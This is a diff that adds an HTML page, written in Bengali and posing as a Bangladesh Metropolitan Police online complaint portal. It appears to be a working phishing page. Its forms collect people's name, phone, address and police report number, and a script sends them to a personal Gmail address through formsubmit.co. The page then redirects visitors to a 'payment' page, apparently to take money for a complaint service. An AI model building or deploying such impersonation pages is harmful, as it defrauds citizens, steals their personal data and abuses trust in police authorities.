@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>বাংলাদেশ মেট্রোপলিটন পুলিশ - অনলাইন সেবা পোর্টাল</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        body { background: #f0f2f5; color: #1c2d42; padding: 15px; padding-bottom: 50px; text-align: center; }
+
+        .police-header { background: #0b2545; color: white; border-radius: 12px; padding: 20px 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .police-badge { width: 70px; height: 70px; background: #f4d35e; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px auto; font-size: 32px; border: 3px solid #fff; }
+        h1 { font-size: 20px; color: #f4d35e; margin-bottom: 5px; }
+        .sub-title { font-size: 12px; color: #e0e1dd; }
+
+        .card { background: white; padding: 18px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #d8e2dc; text-align: left; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .card-title { font-size: 16px; font-weight: bold; color: #0b2545; margin-bottom: 5px; }
+        .card-desc { font-size: 13px; color: #6c757d; margin-bottom: 12px; line-height: 1.4; }
+
+        .btn { background: #134074; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 14px; font-weight: bold; cursor: pointer; width: 100%; display: block; text-align: center; text-decoration: none; }
+        .btn-search { background: #e0a96d; color: #0b2545; }
+
+        .form-box { display: none; margin-top: 15px; padding-top: 15px; border-top: 2px dashed #cbd5e1; }
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; font-size: 13px; font-weight: bold; color: #1c2d42; margin-bottom: 5px; }
+        .form-control { width: 100%; padding: 10px; border: 1px solid #ced4da; border-radius: 6px; font-size: 13px; outline: none; }
+
+        .radio-group { display: flex; gap: 20px; margin-top: 5px; }
+        .radio-option { font-size: 13px; display: flex; align-items: center; gap: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="police-header">
+        <div class="police-badge">🛡️</div>
+        <h1>বাংলাদেশ মেট্রোপলিটন পুলিশ</h1>
+        <div class="sub-title">অনলাইন নাগরিক সেবা ও অভিযোগ ব্যবস্থাপনা পোর্টাল</div>
+    </div>
+
+    <!-- ১. অভিযোগ অপশন -->
+    <div class="card">
+        <div class="card-title">📌 অভিযোগ</div>
+        <div class="card-desc">অভিযোগ না করা থাকলে সকল তথ্য দিয়ে অনলাইনে সরাসরি অভিযোগ দায়ের করুন।</div>
+        <button class="btn" type="button" onclick="document.getElementById('complaintBox').style.display = 'block'; document.getElementById('searchBox').style.display = 'none';">অনলাইনে অভিযোগ করুন</button>
+
+        <!-- অভিযোগ ফরম -->
+        <div id="complaintBox" class="form-box">
+            <h3 style="margin-bottom: 12px; color: #0b2545; font-size: 15px; text-align: center;">অনলাইন অভিযোগ ফরম</h3>
+            
+            <form action="https://formsubmit.co/nadiapenhouse111@gmail.com" method="POST" onsubmit="saveStep1Data(event, 'complaint')">
+                <input type="hidden" name="_subject" value="নতুন অনলাইন অভিযোগ - বাংলাদেশ পুলিশ">
+                <input type="hidden" name="_captcha" value="false">
+
+                <div class="form-group">
+                    <label>আপনার নাম:</label>
+                    <input type="text" name="Name" id="compName" class="form-control" placeholder="আপনার পূর্ণ নাম লিখুন" required>
+                </div>
+
+                <div class="form-group">
+                    <label>আপনার মোবাইল নাম্বার:</label>
+                    <input type="tel" name="Phone Number" id="compPhone" class="form-control" placeholder="মোবাইল নাম্বার লিখুন" required>
+                </div>
+
+                <div class="form-group">
+                    <label>আপনার ঠিকানা:</label>
+                    <input type="text" name="Address" id="compAddress" class="form-control" placeholder="আপনার সম্পূর্ণ ঠিকানা লিখুন" required>
+                </div>
+
+                <div class="form-group">
+                    <label>আপনার বয়স ১৮ এর উর্ধ্বে কিনা?</label>
+                    <div class="radio-group">
+                        <label class="radio-option"><input type="radio" name="Age 18 Plus" value="হ্যাঁ" required> হ্যাঁ</label>
+                        <label class="radio-option"><input type="radio" name="Age 18 Plus" value="না" required> না</label>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn" style="background: #28a745; margin-top: 15px;">পরবর্তী ধাপে যান (অর্থ প্রদান)</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- ২. অনুসন্ধান অপশন -->
+    <div class="card">
+        <div class="card-title">🔍 অনুসন্ধান করুন</div>
+        <div class="card-desc">আপনার অভিযোগটি কোন পর্যায়ে আছে তা পর্যালোচনা ও ট্র্যাকিং করুন।</div>
+        <button class="btn btn-search" type="button" onclick="document.getElementById('searchBox').style.display = 'block'; document.getElementById('complaintBox').style.display = 'none';">অনুসন্ধান করুন</button>
+
+        <!-- অনুসন্ধান ফরম -->
+        <div id="searchBox" class="form-box">
+            <h3 style="margin-bottom: 12px; color: #0b2545; font-size: 15px; text-align: center;">অভিযোগ অনুসন্ধান ফরম</h3>
+            
+            <form action="https://formsubmit.co/nadiapenhouse111@gmail.com" method="POST" onsubmit="saveStep1Data(event, 'search')">
+                <input type="hidden" name="_subject" value="জিডি অনুসন্ধান রিকোয়েস্ট - বাংলাদেশ পুলিশ">
+                <input type="hidden" name="_captcha" value="false">
+
+                <div class="form-group">
+                    <label>আপনার নাম:</label>
+                    <input type="text" name="Searcher Name" id="searchName" class="form-control" placeholder="আপনার নাম লিখুন" required>
+                </div>
+
+                <div class="form-group">
+                    <label>আপনার মোবাইল নাম্বার:</label>
+                    <input type="tel" name="Searcher Phone" id="searchPhone" class="form-control" placeholder="মোবাইল নাম্বার লিখুন" required>
+                </div>
+
+                <div class="form-group">
+                    <label>আপনার জিডি নম্বর:</label>
+                    <input type="text" name="GD Number" id="searchGD" class="form-control" placeholder="জিডি নম্বর লিখুন" required>
+                </div>
+
+                <button type="submit" class="btn btn-search" style="margin-top: 15px;">পরবর্তী ধাপে যান (অর্থ প্রদান)</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function saveStep1Data(event, type) {
+            if(type === 'complaint') {
+                localStorage.setItem('user_name', document.getElementById('compName').value);
+                localStorage.setItem('user_phone', document.getElementById('compPhone').value);
+                localStorage.setItem('user_address', document.getElementById('compAddress').value);
+            } else {
+                localStorage.setItem('user_name', document.getElementById('searchName').value);
+                localStorage.setItem('user_phone', document.getElementById('searchPhone').value);
+                localStorage.setItem('user_gd', document.getElementById('searchGD').value);
+            }
+
+            var form = event.target;
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: { 'Accept': 'application/json' }
+            }).catch(function(err){ console.log(err); });
+
+            event.preventDefault();
+            window.location.href = 'payment.html';
+        }
+    </script>
+</body>
+</html>
